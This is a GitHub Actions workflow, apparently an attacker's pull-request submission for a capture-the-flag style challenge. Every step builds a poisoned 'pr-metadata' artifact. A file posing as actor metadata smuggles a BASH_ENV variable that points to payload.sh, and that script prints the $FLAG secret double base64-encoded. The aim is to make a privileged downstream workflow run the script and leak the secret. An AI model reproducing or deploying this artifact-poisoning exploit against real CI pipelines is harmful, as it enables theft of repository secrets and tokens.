name: PR metadata
on: pull_request
permissions: {}
jobs:
  metadata:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir artifact
          printf 'PR_ACTOR=me\nBASH_ENV=pr-artifact/payload.sh\n' > artifact/actor.txt
          printf 'printf %%s ”$FLAG” | base64 | base64\n'> artifact/payload.sh
      - uses: actions/upload-artifact@v7.0.2
        with:
          name: pr-metadata
          path: artifact/
